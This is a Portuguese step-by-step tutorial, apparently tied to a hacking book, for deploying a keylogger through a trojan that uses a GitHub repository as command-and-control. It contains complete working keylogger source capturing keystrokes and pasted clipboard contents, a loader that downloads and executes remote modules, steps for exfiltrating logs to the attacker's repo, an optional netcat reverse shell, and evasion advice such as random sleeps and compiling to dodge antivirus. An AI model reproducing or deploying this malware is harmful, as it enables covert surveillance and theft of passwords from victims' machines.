# Tutorial — Integrando o Keylogger (Cap. 8) ao Trojan GitHub (Cap. 7)

> Este tutorial mostra, passo a passo, como colocar o `keylogger.py` no repositório GitHub e fazer o `git_trojan.py` puxá-lo, executá-lo e devolver os resultados.

## 1. Conceito e arquitetura

O trojan do Capítulo 7 é um **carregador modular**. Ele não contém lógica de keylogging — ele apenas:

1. Lê `config/abc.json` do GitHub.
2. Para cada módulo listado, importa dinamicamente de `modules/<nome>.py`.
3. Chama `run()` do módulo.
4. Envia o retorno para `data/<id>/<timestamp>.data`.

Portanto, para "instalar" o keylogger na vítima, você **não** copia o `keylogger.py` para ela. Você o coloca no **GitHub**, adiciona `"keylogger"` ao `abc.json`, e o trojan faz o resto.

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│  Atacante       │         │  GitHub          │         │  Vítima         │
│  (Kali)         │         │  bhtprojan       │         │  (Windows)      │
│                 │         │                  │         │                 │
│  git push ──────┼────────>│  config/abc.json │<────────┼── git_trojan.py │
│                 │         │  modules/        │         │   (baixa config │
│                 │         │    keylogger.py  │         │    e módulos)   │
│                 │         │  data/abc/       │<────────┼── envia results │
│  git pull <─────┼─────────│                  │         │                 │
└─────────────────┘         └──────────────────┘         └─────────────────┘
```

## 2. Pré-requisitos

### Na máquina atacante (Kali)

- Git instalado
- Python 3.6–3.11 (o `GitImporter` do livro usa API antiga; veja §7 para Python 3.12+)
- Conta no GitHub
- Repositório `bhtprojan` criado
- Token de acesso pessoal com permissões de `repo`

### Na máquina vítima (Windows)

- Python 3.6–3.11 instalado
- Bibliotecas:
  ```cmd
  pip install github3.py pyWinhook pywin32
  ```
  - `github3.py` → comunicação com GitHub
  - `pyWinhook` → hooks de teclado
  - `pywin32` → `win32clipboard`, `pythoncom`
- (Opcional) `pyinstaller` para compilar o trojan em `.exe`:
  ```cmd
  pip install pyinstaller
  ```

## 3. Estrutura do repositório

```
bhtprojan/
├── .gitignore
├── config/
│   └── abc.json
├── modules/
│   ├── dirlister.py
│   ├── environment.py
│   └── keylogger.py     <-- NOVO
└── data/
    └── abc/             <-- resultados enviados pelo trojan
```

## 4. Passo 1 — Criar o token do GitHub

1. Acesse https://github.com/settings/tokens
2. Clique em **Generate new token (classic)**
3. Marque o escopo **`repo`** (leitura e escrita)
4. Gere e copie o token
5. Na máquina atacante, salve em `mytoken.txt`:
   ```bash
   $ echo "ghp_xxxxxxxxxxxxxxxxxxxx" > mytoken.txt
   ```
6. Adicione ao `.gitignore`:
   ```bash
   $ echo "mytoken.txt" >> .gitignore
   ```

> **Importante:** o token **nunca** deve ir para o GitHub. Se vazar, qualquer um pode ler/apagar seus dados.

## 5. Passo 2 — Adaptar o keylogger como módulo

O `keylogger.py` do livro define `def run():` (sem argumentos). O `module_runner` do trojan chama `run()` sem argumentos, então **funciona como está**. Porém, para seguir a convenção do livro (`run(**args)`), e para corrigir o bug do `time.thread_time()`, use a versão abaixo.

Salve em `modules/keylogger.py`:

```python
from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60 * 10  # 10 minutos


class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512
        )
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'[event.Key]')
        return True


def run(**args):
    """Entry point chamado pelo git_trojan.module_runner()."""
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()

    # CORREÇÃO: usar tempo de PAREDE, não tempo de CPU da thread.
    start = time.time()
    while (time.time() - start) < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log
```

### Mudanças em relação ao original

| Original | Adaptado | Motivo |
|----------|----------|--------|
| `def run():` | `def run(**args):` | Convenção do livro para módulos. |
| `while time.thread_time() < TIMEOUT:` | `start = time.time(); while (time.time() - start) < TIMEOUT:` | `thread_time()` é tempo de CPU, não de parede. O loop original poderia rodar por horas. |
| `import os` | removido | Não era usado. |

## 6. Passo 3 — Configurar o `abc.json`

Edite `config/abc.json` para incluir o keylogger:

```json
[
    {
        "module": "dirlister"
    },
    {
        "module": "environment"
    },
    {
        "module": "keylogger"
    }
]
```

> O trojan vai baixar este JSON, ver `keylogger`, e acionar o `GitImporter` para buscar `modules/keylogger.py`.

## 7. Passo 4 — Push para o GitHub

Na máquina atacante, dentro do repo:

```bash
$ git add modules/keylogger.py config/abc.json
$ git commit -m "Adds keylogger module"
$ git push origin master
Username: <seu-usuario>
Password: <seu-token>   # use o token, não a senha
```

Confirme no navegador que `modules/keylogger.py` e `config/abc.json` estão no repo.

## 8. Passo 5 — Preparar a vítima

Copie para a vítima (Windows):

1. `git_trojan.py`
2. `mytoken.txt`
3. (Opcional) `netcat.exe` se quiser shell reverso

Instale as dependências:

```cmd
C:\> pip install github3.py pyWinhook pywin32
```

> Se for compilar com PyInstaller:
> ```cmd
> C:\> pyinstaller -F git_trojan.py
> ```
> O `.exe` ficará em `dist\`.

## 9. Passo 6 — Executar o trojan

Na vítima:

```cmd
C:\> python git_trojan.py
```

Saída esperada:

```
[*] Attempting to retrieve dirlister
[*] Attempting to retrieve environment
[*] Attempting to retrieve keylogger
[*] In dirlister module.
[*] In environment module.
```

O keylogger agora está capturando teclas por 10 minutos. Após esse período, o trojan enviará o log para `data/abc/<timestamp>.data` no GitHub e dormirá de 30 min a 3 h.

### O que acontece nos bastidores

1. `sys.meta_path.append(GitImporter())` registra o importador.
2. `Trojan('abc').run()` entra no loop.
3. `get_config()` baixa `config/abc.json`, decodifica de base64, e para cada módulo faz `exec("import <modulo>")`.
4. O `import keylogger` não encontra o módulo localmente → Python chama `GitImporter.find_module('keylogger')`.
5. `find_module` baixa `modules/keylogger.py` do GitHub, decodifica de base64, e retorna `self`.
6. `load_module` cria o módulo e executa o código no namespace dele.
7. `module_runner('keylogger')` chama `sys.modules['keylogger'].run()`.
8. O keylogger roda por 10 min, retorna o log como string.
9. `store_module_result` cria `data/abc/<timestamp>.data` no GitHub com o log em base64.

## 10. Passo 7 — Coletar resultados

Na máquina atacante:

```bash
$ git pull origin master
$ ls data/abc/
2026-09-24T14:32:11.123456.data
2026-09-24T14:32:15.654321.data
...
```

Cada `.data` contém o resultado codificado em base64. Para decodificar:

```python
import base64

with open('data/abc/2026-09-24T14:32:11.123456.data', 'rb') as f:
    raw = f.read()

decoded = base64.b64decode(raw).decode('utf-8')
# decoded é algo como: "'[processo 1234 notepad.exe] ola mundo[PASTE] - senha123'"
print(decoded)
```

Ou, no terminal:

```bash
$ cat data/abc/2026-09-24T14:32:11.123456.data | base64 -d
```

## 11. Solução de problemas

### `ImportError: cannot import name 'spec_from_module'`

O código do livro usa `importlib.util.spec_from_module`, que **não existe**. Use a versão modernizada do `GitImporter` (veja §12).

### `TypeError: find_module() missing 1 required positional argument`

Em Python 3.12+, `find_module`/`load_module` foram **removidos**. Use a versão modernizada.

### `github3.exceptions.NotFoundError` no `create_file`

Versões recentes do `github3.py` mudaram a assinatura de `create_file`. Se der erro, tente passar o conteúdo **sem** base64:

```python
self.repo.create_file(remote_path, message, bindata)
```

Ou consulte a documentação da versão instalada.

### Keylogger não captura nada

- Rode o trojan como **Administrador** (hooks de teclado exigem privilégio).
- Verifique se `pyWinhook` está instalado: `pip show pyWinhook`.
- O `TIMEOUT` de 10 min pode ter expirado antes de você digitar. Aumente se necessário.

### `UnicodeDecodeError` no `get_current_process`

Alguns títulos de janela têm caracteres não-UTF8. O `try/except` já trata, mas se incomodar, use `.decode('utf-8', errors='replace')`.

## 12. Versão modernizada do `GitImporter` (Python 3.12+)

Substitua a classe `GitImporter` no `git_trojan.py` por:

```python
import importlib.abc
import importlib.util
import sys


class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, name, path=None, target=None):
        print(f"[*] Attempting to retrieve {name}")
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return importlib.util.spec_from_loader(name, self)
        return None

    def create_module(self, spec):
        return None  # usa criação padrão

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)
```

E no `__main__`:

```python
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
```

## 13. Considerações de segurança (OPSEC)

- **Token:** use um token separado para cada trojan. Se um vazar, você revoga só aquele.
- **Repositório privado:** obrigatório. Se for público, qualquer um vê seus módulos e resultados.
- **Base64 não é criptografia:** os resultados no GitHub estão apenas codificados. Use as técnicas do Capítulo 9 (AES + RSA) para criptografar antes de enviar.
- **Tráfego para GitHub:** é HTTPS, então não é interceptado por proxy corporativo comum. Mas alguns ambientes bloqueiam GitHub — teste antes.
- **Sleep aleatório:** o trojan dorme de 30 min a 3 h entre ciclos. Isso reduz a chance de detecção por análise de padrão de rede.
- **Compile o trojan:** usar PyInstaller evita depender de Python instalado na vítima, mas o `.exe` fica com ~7 MB e pode ser flagged por AV.

## 14. Resumo do fluxo

```
[Atacante]                    [GitHub]                     [Vítima]
    |                             |                             |
    |-- push keylogger.py ------->|                             |
    |-- push abc.json ----------->|                             |
    |                             |<---- baixa abc.json --------|
    |                             |<---- baixa keylogger.py ----|
    |                             |                             |-- executa keylogger
    |                             |<---- envia log -------------|
    |<---- git pull --------------|                             |
    |-- decodifica base64 --------|                             |
```

É isso. O keylogger agora faz parte do seu trojan modular, e você pode adicionar qualquer outro módulo do Capítulo 8 (ou seus próprios) da mesma forma: basta criar o `.py` em `modules/`, adicionar ao `abc.json`, e dar `git push`.